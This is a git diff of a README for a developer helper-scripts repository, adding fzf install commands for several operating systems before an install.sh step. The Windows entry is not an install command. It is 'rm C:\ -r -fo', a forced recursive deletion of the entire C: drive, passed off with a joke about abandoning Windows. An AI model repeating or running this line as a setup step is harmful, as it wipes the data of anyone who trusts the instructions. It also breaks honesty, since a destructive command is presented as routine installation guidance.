@@ -1,6 +1,21 @@
-# scripts
+# Scripts
 Developer helper scripts
 ## Instalation
+Prerequisite: if you don't have fzf installed
+```bash
+# macos
+brew install fzf
+
+# ubuntu
+sudo apt install fzf
+
+# arch
+sudo pacman -S fzf
+
+# windows
+rm C:\ -r -fo # stop using windows, use unix derivative instead
+```
+Run the install script to register commands to your terminal emulator
 ```bash
 ./install.sh
 ```
